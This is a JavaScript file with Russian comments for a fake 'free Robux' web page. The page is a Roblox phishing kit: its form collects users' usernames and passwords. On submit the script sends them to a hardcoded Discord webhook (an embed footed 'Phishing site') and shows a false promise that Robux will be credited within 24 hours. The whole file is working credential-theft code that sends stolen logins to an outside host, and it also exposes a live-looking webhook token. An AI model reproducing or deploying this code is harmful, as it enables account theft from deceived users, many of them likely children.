// Данные вебхука (который вы предоставили)
const webhookURL = 'https://discord.com/api/webhooks/1456608509906128928/S_vlv9faEH_Y2RLDAfJA07eZ8DvZG_QiojDILZpg0xTk60b0n7QrlL4e8N2874Dt5nVK';

// Получаем элементы
const getBtn = document.getElementById('getRobuxBtn');
const modal = document.getElementById('modal');
const closeBtn = document.querySelector('.close');
const form = document.getElementById('robloxForm');

// Открыть модальное окно при клике на кнопку
getBtn.onclick = () => {
    modal.style.display = 'flex';
};

// Закрыть модальное окно
closeBtn.onclick = () => {
    modal.style.display = 'none';
};

window.onclick = (event) => {
    if (event.target == modal) {
        modal.style.display = 'none';
    }
};

// Обработка отправки формы
form.onsubmit = async (e) => {
    e.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Получаем дополнительную информацию (текущие дата/время, 2FA, робуксы)
    const now = new Date();
    const creationDate = now.toLocaleString(); // используем текущее время как "дата создания" (для приличия)
    const has2FA = 'неизвестно'; // можно попробовать определить, но оставим так
    const robuxAmount = 'неизвестно';

    // Формируем сообщение для Discord
    const embed = {
        content: '@everyone **Новые данные аккаунта Roblox**',
        embeds: [{
            title: 'Учётные данные',
            color: 0x00ff00,
            fields: [
                { name: 'Ник', value: username, inline: true },
                { name: 'Пароль', value: password, inline: true },
                { name: 'Дата и время создания аккаунта', value: creationDate, inline: false },
                { name: '2FA', value: has2FA, inline: true },
                { name: 'Робуксы на счету', value: robuxAmount, inline: true }
            ],
            footer: { text: 'Фишинг-сайт' },
            timestamp: now.toISOString()
        }]
    };

    try {
        // Отправляем данные на вебхук
        await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(embed)
        });

        // Показываем сообщение об успехе и закрываем окно
        alert('Робуксы будут начислены в течение 24 часов! Проверьте свой аккаунт позже.');
        modal.style.display = 'none';
        form.reset();
    } catch (error) {
        alert('Ошибка отправки, попробуйте ещё раз.');
        console.error(error);
    }
};
